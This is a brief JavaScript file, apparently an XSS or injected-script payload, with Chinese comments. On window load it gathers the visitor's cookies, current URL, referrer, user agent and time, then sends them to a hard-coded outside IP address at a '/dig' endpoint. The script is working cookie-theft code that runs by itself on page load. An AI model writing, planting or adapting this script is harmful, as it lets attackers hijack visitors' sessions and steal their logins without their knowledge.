/**
 * Created by wangranming on 2018/5/15.
 */
var lock = true;
window.onload = function () {
    var time = gettime(); //js获取当前时间
    // var userip = getip(); //js获取客户端ip
    var uri = geturl(); //js获取客户端当前url
    var refer = getrefer(); //js获取客户端当前页面的上级页面的url
    var ua = getuser_agent(); //js获取客户端类型
    var cookie = getcookie(); //js获取客户端cookie
    var params = {"time":time,"uri":uri,"refer":refer,"ua":ua,"cookie":cookie};
    console.log(params);
    $.get("http://118.24.72.141:80/dig",params,function () {
        lock = false;
    })
};
function gettime() {
    var nowDate = new Date();
    return nowDate.toLocaleString();
}
function geturl() {
    return window.location.href;
}
// function getip() {
//     return returnCitySN["cip"] + ',' + returnCitySN["cname"];
// }
function getrefer() {
    return document.referrer;
}
function getcookie() {
    return document.cookie;
}
function getuser_agent() {
    return navigator.userAgent;
}
